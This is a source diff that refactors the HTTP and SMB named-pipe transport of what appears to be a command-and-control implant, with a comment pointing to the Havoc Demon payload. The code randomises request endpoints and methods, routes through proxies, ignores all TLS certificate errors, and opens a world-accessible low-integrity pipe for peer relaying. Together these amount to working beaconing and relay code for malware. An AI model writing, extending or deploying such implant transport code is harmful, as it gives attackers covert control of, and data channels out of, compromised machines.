@@ -1,42 +1,43 @@
-#include <core/include/network.hpp>
+#include <include/network.hpp>
+using namespace Stream;
+
 namespace Network {
     namespace Http {
 
-        VOID HttpSendRequest(HINTERNET request, _stream **stream) {
+        BOOL HttpSendRequest(HINTERNET request, _stream **stream) {
 
             void *buffer    = { };
             void *download  = { };
 
-            uint32_t read   = 0;
-            uint32_t total  = 0;
-            uint32_t length = 0;
+            DWORD read   = 0;
+            DWORD total  = 0;
+            DWORD length = 0;
 
             do {
-                x_assert(Ctx->win32.WinHttpQueryDataAvailable(request, (DWORD*) &length));
+                if (!Ctx->win32.WinHttpQueryDataAvailable(request, &length)) {
+                    return false;
+                }
 
                 if (!buffer) { buffer = x_malloc(length + 1); }
-                if (!download) {
-                    download = x_malloc(length + 1);
-                }
-                else {
-                    download = x_realloc(download, total + length + 1);
-                }
+                if (!download) { download = x_malloc(length + 1); }
+                else { download = x_realloc(download, total + length + 1); }
 
                 x_memset(buffer, 0, length + 1);
-                x_assert(Ctx->win32.WinHttpReadData(request, buffer, length, (DWORD*) &read));
+                if (!Ctx->win32.WinHttpReadData(request, buffer, length, &read)) {
+                    return false;
+                }
 
                 x_memcpy(B_PTR(download) + total, buffer, read);
                 x_zerofree(buffer, read);
 
                 total += read;
-
             } while (length > 0);
 
             (*stream)           = (_stream*) x_malloc(sizeof(_stream));
             (*stream)->buffer   = B_PTR(download);
             (*stream)->length   = total;
 
-            defer:
+            return true;
         }
 
         VOID DestroyRequestContext(const _request_context *req_ctx) {
@@ -63,23 +64,26 @@ namespace Network {
 
         BOOL CreateRequestContext(_request_context *req_ctx) {
 
-            bool success            = true;
             const wchar_t *endpoint = { };
 
             if (!Ctx->transport.http->handle) {
-                x_assert(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
+                if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
+                    return false;
+                }
             }
 
-            x_assert(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0));
+            if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0))) {
+                return false;
+            }
 
             if (Ctx->transport.http->endpoints) {
                 RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);
 
                 req_ctx->endpoint = (wchar_t*) x_malloc((x_wcslen(endpoint)+ 1) * sizeof(wchar_t));
-                x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
+                x_memcpy(req_ctx->endpoint, (void*) endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
             }
             else {
-                success_(false);
+                return false;
             }
 
             Ctx->transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
@@ -87,25 +91,29 @@ namespace Network {
                 Ctx->transport.http->flags |= WINHTTP_FLAG_SECURE;
             }
 
-            x_assert(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, Ctx->transport.http->method, req_ctx->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags));
+            if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, Ctx->transport.http->method, req_ctx->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags))) {
+                return false;
+            }
 
-            defer:
-            return success;
+            return true;
         }
 
         BOOL CreateProxyContext(_proxy_context *const proxy_ctx, const _request_context *const req_ctx) {
-
-            bool success = true;
 
             if (Ctx->transport.b_proxy) {
                 proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                 proxy_ctx->proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;
 
-                x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO)));
+                if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
+                    return false;
+                }
 
                 if (Ctx->transport.http->proxy->username && Ctx->transport.http->proxy->password) {
-                    x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)));
-                    x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password)));
+                    if (
+                        !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)) ||
+                        !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password))) {
+                        return false;
+                    }
                 }
             }
             else if (!Ctx->transport.b_envproxy_check) {
@@ -114,7 +122,7 @@ namespace Network {
                 proxy_ctx->autoproxy.lpszAutoConfigUrl      = nullptr;
                 proxy_ctx->autoproxy.lpvReserved            = nullptr;
                 proxy_ctx->autoproxy.dwReserved             = 0;
-                proxy_ctx->autoproxy.fAutoLogonIfChallenged = TRUE;
+                proxy_ctx->autoproxy.fAutoLogonIfChallenged = true;
 
                 if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
                     Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
@@ -154,22 +162,24 @@ namespace Network {
             }
 
             if (Ctx->transport.env_proxy) {
-                x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen));
+                if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen)) {
+                    return false;
+                }
             }
 
-            defer:
-            return success;
+            return true;
         }
 
-        VOID HttpCallback(const _stream *const out, _stream **in) {
+        BOOL HttpCallback(const _stream *const out, _stream **in) {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
             // todo: reverting tokens during http operations
 
+            bool success = true;
             _proxy_context proxy_ctx = { };
             _request_context req_ctx = { };
 
-            uint32_t status     = 0;
-            uint32_t n_status   = sizeof(uint32_t);
+            uint32_t status  = 0;
+            DWORD n_status   = sizeof(uint32_t);
 
             wchar_t *methods[] = {
                 (wchar_t*)L"GET",
@@ -178,13 +188,13 @@ namespace Network {
 
             RANDOM_SELECT(Ctx->transport.http->method, methods);
 
-            x_assert(CreateRequestContext(&req_ctx));
-            x_assert(CreateProxyContext(&proxy_ctx, &req_ctx));
+            x_assertb(CreateRequestContext(&req_ctx));
+            x_assertb(CreateProxyContext(&proxy_ctx, &req_ctx));
 
             if (Ctx->transport.b_ssl) {
                 Ctx->transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-                x_assert(Ctx->win32.WinHttpSetOption(req_ctx.req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG)));
+                x_assertb(Ctx->win32.WinHttpSetOption(req_ctx.req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG)));
             }
 
             if (Ctx->transport.http->headers) {
@@ -196,24 +206,26 @@ namespace Network {
                         break;
                     }
 
-                    x_assert(Ctx->win32.WinHttpAddRequestHeaders(req_ctx.req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD));
+                    x_assertb(Ctx->win32.WinHttpAddRequestHeaders(req_ctx.req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD));
                     n_headers++;
                 }
             }
 
-            x_assert(Ctx->win32.WinHttpSendRequest(req_ctx.req_handle, nullptr, 0, out->buffer, out->length, out->length, 0));
-            x_assert(Ctx->win32.WinHttpReceiveResponse(req_ctx.req_handle, nullptr));
-            x_assert(Ctx->win32.WinHttpQueryHeaders(req_ctx.req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, (DWORD*) &n_status, nullptr));
+            x_assertb(Ctx->win32.WinHttpSendRequest(req_ctx.req_handle, nullptr, 0, out->buffer, out->length, out->length, 0));
+            x_assertb(Ctx->win32.WinHttpReceiveResponse(req_ctx.req_handle, nullptr));
+            x_assertb(Ctx->win32.WinHttpQueryHeaders(req_ctx.req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, (DWORD*) &n_status, nullptr));
 
             if (status != HTTP_STATUS_OK) {
                 return_defer(status);
             }
 
-            HttpSendRequest(req_ctx.req_handle, in);
+            x_assertb(HttpSendRequest(req_ctx.req_handle, in));
 
             defer:
             DestroyRequestContext(&req_ctx);
             DestroyProxyContext(&proxy_ctx);
+
+            return success;
         }
     }
 
@@ -227,18 +239,20 @@ namespace Network {
             if (SmbSecAttr->sec_desc)   { x_free(SmbSecAttr->sec_desc); }
         }
 
-        VOID SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
+        BOOL SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
 
             SID_IDENTIFIER_AUTHORITY sid_auth   = SECURITY_WORLD_SID_AUTHORITY;
             SID_IDENTIFIER_AUTHORITY sid_label  = SECURITY_MANDATORY_LABEL_AUTHORITY;
 
+            PACL acl = { };
             EXPLICIT_ACCESSA access = { };
-            PACL acl                = { };
 
             x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
             x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
 
-            x_assert(Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low));
+            if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low)) {
+                return false;
+            }
 
             access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
             access.grfInheritance       = NO_INHERITANCE;
@@ -248,26 +262,37 @@ namespace Network {
             access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
             access.Trustee.ptstrName    = (LPSTR) SmbSecAttr->sid;
 
-            x_assert(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl));
-            x_assert(Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low));
-
-            x_assert((SmbSecAttr->p_acl = (PACL) x_malloc(MAX_PATH)));
-
-            x_assert(Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS));
-            x_assert(Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low));
-
-            x_assert(SmbSecAttr->sec_desc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH));
-
-            x_assert(Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION));
-            x_assert(Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE));
-            x_assert(Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE));
-
-            defer:
-            if (ntstatus == ERROR_SUCCESS) {
-                SecAttr->lpSecurityDescriptor   = SmbSecAttr->sec_desc;
-                SecAttr->nLength                = sizeof(SECURITY_ATTRIBUTES);
-                SecAttr->bInheritHandle         = false;
+            uint32_t status = Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl);
+            if (status) {
+                return false;
             }
+
+            if (!Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low)) {
+                return false;
+            }
+
+            SmbSecAttr->p_acl = (PACL) x_malloc(MAX_PATH);
+
+            if (
+                !Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS) ||
+                !Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low)) {
+                return false;
+            }
+
+            SmbSecAttr->sec_desc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
+
+            if (
+                !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION) ||
+                !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE) ||
+                !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE)) {
+                return false;
+            }
+
+            SecAttr->lpSecurityDescriptor = SmbSecAttr->sec_desc;
+            SecAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
+            SecAttr->bInheritHandle = false;
+
+            return true;
         }
 
         BOOL PipeRead(void *const handle, const _stream *in) {
@@ -310,19 +335,21 @@ namespace Network {
 
         BOOL PipeSend (_stream *out) {
 
-            bool success = true;
             SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
             SECURITY_ATTRIBUTES sec_attr    = { };
 
             if (!Ctx->transport.pipe_handle) {
-                SmbContextInit(&smb_sec_attr, &sec_attr);
-                x_assert(Ctx->transport.pipe_handle = Ctx->win32.CreateNamedPipeW(Ctx->transport.pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr));
+                if (
+                    !SmbContextInit(&smb_sec_attr, &sec_attr) ||
+                    !(Ctx->transport.pipe_handle = Ctx->win32.CreateNamedPipeW(Ctx->transport.pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
+                    return false;
+                }
 
                 SmbContextDestroy(&smb_sec_attr);
 
                 if (!Ctx->win32.ConnectNamedPipe(Ctx->transport.pipe_handle, nullptr)) {
                     Ctx->nt.NtClose(Ctx->transport.pipe_handle);
-                    success_(false);
+                    return false;
                 }
             }
 
@@ -332,50 +359,45 @@ namespace Network {
                     if (Ctx->transport.pipe_handle) {
                         Ctx->nt.NtClose(Ctx->transport.pipe_handle);
                     }
-                    success_(false);
+                    return false;
                 }
             }
-
-            defer:
-            return success;
+            return true;
         }
 
         BOOL PipeReceive(_stream** in) {
 
-            bool success        = true;
-            uint32_t total      = 0;
             uint32_t peer_id    = 0;
             uint32_t msg_size   = 0;
 
-            if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, (DWORD*) &total, nullptr)) {
+            DWORD total = 0;
+            *in = CreateStream();
+
+            if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, &total, nullptr)) {
                 if (total > sizeof(uint32_t) * 2) {
 
-                    x_assert(Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), (DWORD*) &total, nullptr));
-
+                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), &total, nullptr)) {
+                        return false;
+                    }
                     if (Ctx->session.peer_id != peer_id) {
-                        ntstatus = ERROR_INVALID_PARAMETER;
-                        success_(false);
+                        return false;
                     }
-
-                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), (DWORD*) &total, nullptr)) {
+                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), &total, nullptr)) {
                         if (ntstatus != ERROR_MORE_DATA) {
-                            success_(false);
+                            return false;
                         }
                     }
 
-                    if (
-                        !(*in = Stream::CreateStream()) || !PipeRead(Ctx->transport.pipe_handle, *in)) {
+                    if (!PipeRead(Ctx->transport.pipe_handle, *in)) {
                         if (*in) {
-                            Stream::DestroyStream(*in);
+                            DestroyStream(*in);
                         }
-
-                        success_(false);
+                        return false;
                     }
                 }
             }
 
-            defer:
-            return success;
+            return true;
         }
     }
 }
